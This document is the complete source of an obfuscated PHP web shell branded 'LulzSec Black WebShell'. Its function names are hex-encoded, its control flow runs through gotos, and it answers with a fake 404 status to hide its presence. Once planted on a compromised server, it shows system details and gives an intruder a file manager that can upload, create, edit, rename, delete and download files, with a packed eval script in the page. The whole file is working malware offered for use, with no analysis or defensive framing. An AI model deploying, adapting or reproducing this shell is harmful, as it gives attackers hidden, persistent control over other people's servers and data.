<?php error_reporting(0);
http_response_code(404);
define("Yp", "");
$G3 = "scandir";
$c8 = [
    "7068705f756e616d65",
    "70687076657273696f6e",
    "676574637764",
    "6368646972",
    "707265675f73706c6974",
    "61727261795f64696666",
    "69735f646972",
    "69735f66696c65",
    "69735f7772697461626c65",
    "69735f7265616461626c65",
    "66696c6573697a65",
    "636f7079",
    "66696c655f657869737473",
    "66696c655f7075745f636f6e74656e7473",
    "66696c655f6765745f636f6e74656e7473",
    "6d6b646972",
    "72656e616d65",
    "737472746f74696d65",
    "68746d6c7370656369616c6368617273",
    "64617465",
    "66696c656d74696d65",
];
$lE = 0;
T4:
if (!($lE < count($c8))) {
    goto Je;
}
$c8[$lE] = JD($c8[$lE]);
Cy:
$lE++;
goto T4;
Je:
if (isset($_GET["p"])) {
    goto sr;
}
$Jd = $c8[2]();
goto VN;
sr:
$Jd = jD($_GET["p"]);
$c8[3](Jd($_GET["p"]));
VN:
function Ss($SP)
{
    $dE = "";
    $lE = 0;
    NZ:
    if (!($lE < strlen($SP))) {
        goto Xc;
    }
    $dE .= dechex(ord($SP[$lE]));
    WK:
    $lE++;
    goto NZ;
    Xc:
    return $dE;
}
function Jd($SP)
{
    $dE = "";
    $gf = strlen($SP) - 1;
    $lE = 0;
    Xp:
    if (!($lE < $gf)) {
        goto ur;
    }
    $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1]));
    Wn:
    $lE += 2;
    goto Xp;
    ur:
    return $dE;
}
function rn($F1)
{
    $Jd = fileperms($F1);
    if (($Jd & 0xc000) == 0xc000) {
        goto FZ;
    }
    if (($Jd & 0xa000) == 0xa000) {
        goto Eu;
    }
    if (($Jd & 0x8000) == 0x8000) {
        goto ES;
    }
    if (($Jd & 0x6000) == 0x6000) {
        goto sA;
    }
    if (($Jd & 0x4000) == 0x4000) {
        goto lG;
    }
    if (($Jd & 0x2000) == 0x2000) {
        goto tV;
    }
    if (($Jd & 0x1000) == 0x1000) {
        goto Tx;
    }
    $lE = "u";
    goto cC;
    FZ:
    $lE = "s";
    goto cC;
    Eu:
    $lE = "l";
    goto cC;
    ES:
    $lE = "-";
    goto cC;
    sA:
    $lE = "b";
    goto cC;
    lG:
    $lE = "d";
    goto cC;
    tV:
    $lE = "c";
    goto cC;
    Tx:
    $lE = "p";
    cC:
    $lE .= $Jd & 0x100 ? "r" : "-";
    $lE .= $Jd & 0x80 ? "w" : "-";
    $lE .= $Jd & 0x40 ? ($Jd & 0x800 ? "s" : "x") : ($Jd & 0x800 ? "S" : "-");
    $lE .= $Jd & 0x20 ? "r" : "-";
    $lE .= $Jd & 0x10 ? "w" : "-";
    $lE .= $Jd & 0x8 ? ($Jd & 0x400 ? "s" : "x") : ($Jd & 0x400 ? "S" : "-");
    $lE .= $Jd & 0x4 ? "r" : "-";
    $lE .= $Jd & 0x2 ? "w" : "-";
    $lE .= $Jd & 0x1 ? ($Jd & 0x200 ? "t" : "x") : ($Jd & 0x200 ? "T" : "-");
    return $lE;
}
function Xe($OB, $Ch = 1, $BL = "")
{
    global $Jd;
    $xe = $Ch == 1 ? "success" : "error";
    echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" .
        Ss($Jd) .
        $BL .
        "\"}})</script>";
}
function tF($yf)
{
    global $c8;
    if (!(trim(pathinfo($yf, PATHINFO_BASENAME), ".") === "")) {
        goto IE;
    }
    return;
    IE:
    if ($c8[6]($yf)) {
        goto PF;
    }
    unlink($yf);
    goto jK;
    PF:
    array_map(
        "deldir",
        glob($yf . DIRECTORY_SEPARATOR . "{,.}*", GLOB_BRACE | GLOB_NOSORT)
    );
    rmdir($yf);
    jK:
}
?> 

<!DOCTYPE html>
<html lang="en">
<head>
<meta name="theme-color" content="red">
<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
<title>LulzSec Black WebShell</title>
<link rel="SHORTCUT ICON" href="https://i.postimg.cc/gr9QDMX5/doubleface.jpg">
<meta property="og:title" content="huh? what's in there?"> 
<style> @import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
.bg-dark { background-color: black; }
.border { border: 2px solid #3f48cc!important; border-radius: 0.75rem!important; background-color: transparent; color: white; padding-left: 1rem; }
.table>tbody>tr>* { color: #007fff; vertical-align: middle; border: 2px solid #3f48cc; }
.table thead th { vertical-align: bottom; border: 2px solid #3f48cc; color: #06d6ed; }
.table-hover tbody tr:hover td{ background: #3f3f3f }
.table-hover tbody tr:hover td>*{ }
.table>tbody>tr>*{ color:#fff; vertical-align:middle; }
.form-control{background:0 0!important;color:#fff!important;border-radius:0}
.form-control::placeholder{color:#fff;opacity:1}
li{font-size:17px;margin-left:6px;list-style:none;color: #06d6ed;list-style: inherit;}
a{ color: #ffffff; }
a:hover { text-decoration: none; color: #06d6ed; }
button, input { border: 2px solid #06d6ed;border-radius: 0.5rem;font-size: 1rem;color:white;line-height: normal; }
button, input:hover { border: 2px solid #3f48cc;border-radius: 0.5rem;font-size: 1rem;cursor: pointer; }
.ohct { padding-left: 1rem; padding-right: 1rem; color: white; border: 2px solid #06d6ed; border-radius: 5px; background-color: black; }
.ohct:hover { border: 2px solid #3f48cc; color: white; }
.combet { color: white; }
.combet:hover { color: #06d6ed; }
</style>
<style>
.fa {padding: 10px;font-size: 20px;width: 50px;text-align: center;text-decoration: none;margin: 5px;border-radius: 5px;background: transparent;}
.fa:hover {color: #06d6ed;}
.text-light {color: #f8f9fa!important;font-size: 17px!important;}
</style>
<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body style="background-color:#000;color:black;font-size: 0px ;font-family: 'Kelly Slab';width: 100%;padding: 0.5rem;">
  <div style=" display:flex; align-items:center; justify-content:flex-end; flex-direction:column; margin-bottom:10px;">

  <div style="display:flex; justify-content:flex-end;">
      <a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px #3f48cc;"><span>LulzSec Black </span></a>
    </div>
    <div style="text-align: center;display: flex;align-items: center;justify-content: flex-end;align-content: center;">

    </a>
    <a href="https://t.me/lazagrad" style="margin-right:20px">
    <svg xmlns="http://www.w3.org/2000/svg" width="40px" height="40px" viewBox="0 0 48 48"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" d="M40.83 8.48c1.14 0 2 1 1.54 2.86l-5.58 26.3c-.39 1.87-1.52 2.32-3.08 1.45L20.4 29.26a.4.4 0 0 1 0-.65l15.37-13.88c.7-.62-.15-.92-1.07-.36L15.41 26.54a.46.46 0 0 1-.4.05L6.82 24C5 23.47 5 22.22 7.23 21.33L40 8.69a2.2 2.2 0 0 1 .83-.21m-29.223 3.66h5.832m-2.916 2.916V9.224m7.889 29.888h3.756M24.29 40.99v-3.756m-16.103-6.87h2.579m-1.289 1.29v-2.579m3.084 9.448h2.579m-1.289 1.29v-2.579M41.207 25.71h2.579M42.496 27v-2.579M27.561 9.028h2.579m-1.289 1.289V7.739"/></svg>
    </a>
    </div>
  </div>
<div class="table-responsive text-light" style="border: 2px solid #3f48cc;text-align: left;padding: 0.25rem;border-radius: 0.75rem;">
<li>Your IP : <span style="color: white;"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></li>
<li>Server IP : <span style="color: white;"><?php echo $_SERVER['SERVER_ADDR']; ?></span></li>
<li>Server : <span style="color: white;"><?= $c8[0](); ?></span></li>
<li>Server Software : <span style="color: white;"><?php echo gethostbyname($_SERVER['SERVER_SOFTWARE']); ?></span></li>
<li>Server Name : <span style="color: white;"><?php echo $_SERVER['SERVER_NAME']; ?></span></li>
<li>PHP Version : <span style="color: white;"><?= $c8[1](); ?></span></li>
<li>Add File : <a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>" class="ohct">Submit</a></li>
<li>Add Directory : <a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>" class="ohct">Submit</a></li>
<li><form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
<input type="file" name="f[]" onchange="this.form.submit()" multiple>
<?php if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?> 
</form></li>
</div>
<div style="border: 2px solid #3f48cc;border-radius: 0.75rem;padding: 0.25rem;margin-top: 0.20rem;margin-bottom: 0.25rem;font-family: 'Kelly Slab';">
<li style="font-size: 1.10rem;margin-left: 0.20rem;list-style: inherit;padding: 0.15rem;">Dir : 
<?php $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\" class=\"combet\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a class=\"combet\" href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?> 
</li>
</div>
<article style="text-align: center;font-family: 'Kelly Slab';font-size: 1rem;">
<?php if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
<div class="px-2 py-2">
<?php if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
<?php if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
<h5 class="border p-1">New Folder Name :</h5>
<form method="post">
<div class="form-group">
<input name="n" id="n" class="border" autocomplete="off">
</div>
<div class="form-group">
<button type="submit" name="s" class="ohct">Create</button>
</div> 
</form> 
<?php isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
<h5 class="border p-1">New File Name :</h5>
<form method="post">
<div class="form-group">
<input type="text" name="n" id="n" class="border" placeholder="hack.txt">
</div>
<div class="form-group">
<textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control border" placeholder=""></textarea>
</div>
<div class="form-group">
<button type="submit" name="s" class="ohct">Create</button> 
</div>
</form>
<?php
isset($_POST["s"])
    ? ($c8[12]("{$Jd}/{$_POST["n"]}")
        ? xE("file name has been used", 0, "&a=" . SS("newFile"))
        : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"])
            ? XE("", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"]))
            : Xe("file failed to create", 0)))
    : null;
goto WC;
Lw:
?>
<h5 class="border p-1">Rename File : <?= jD($_GET["n"]); ?></h5>
<form method="post">
<div class="form-group">
<input type="text" name="n" id="n" class="border" value="<?= jD($_GET["n"]); ?>">
</div>
<div class="form-group">
<button type="submit" name="s" class="ohct">Save</button>
</div>
</form>
<?php isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
<h5 class="border p-1">Edit File Name : <?= Jd($_GET["n"]); ?></h5>
<form method="post">
<div class="form-group">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control border"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea>
</div>
<div class="form-group">
<button type="submit" name="s" class="ohct">Save</button>
</div>
</form>
<?php isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
<h5 class="border p-1">View File Name : <?= jd($_GET["n"]); ?></h5>
<div class="form-group">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control border" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea>
</div>
<?php WC: ?>
</div>
<?php goto mR; Un: ?>
<table class="table table-hover table-borderless table-sm" style="text-align: center;">
<thead class="text-light">
<tr>
<th>Name</th>
<th>Size</th>
<th>Permission</th>
<th colspan="3">Action</th>
</tr>
</thead>
<tbody class="text-light"> <?php $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo " 
<tr>
<td style=\"text-align: left;\">
<a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\">
<i class=\"fa fa-fw fa-folder\" style=\"border: 0;padding: 0;width: 1.28571429em;\">
</i> {$yf}
</a>
</td>
<td style=\"color: black;\"><span>------</span></td>
<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>
<td style=\"color: black;\"><span>------</span></td>
<td>
<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\">Rename</a>
</td>
<td>
<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\">Delete</a>
</td>
</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "  MB" : $kL . "  KB"; echo "
<tr>
<td style=\"text-align: left;\">
<a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\">
<i class=\"fa fa-fw fa-file\" style=\"border: 0;padding: 0;width: 1.28571429em;\"></i> {$F1}
</a>
</td>
<td><span>{$kL}</span></td>
<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>
<td><a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\">Edit</a></td>
<td><a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\">Rename</a></td>
<td><a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\">Delete</a></td>
</tr>"; X1: } a2: ?> 
</tbody>
</table>
<h5 style="color: #06d6ed;">
<font>&copy; Copyright 2024</font>
<font style="color: #3f48cc;">DoubleFace</font>
<font>Powered by </font>
<font style="color: #3f48cc;">DoubleFace Team / moon_night</font>
</h5>
<?php mR: ?> 
</article>
<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>
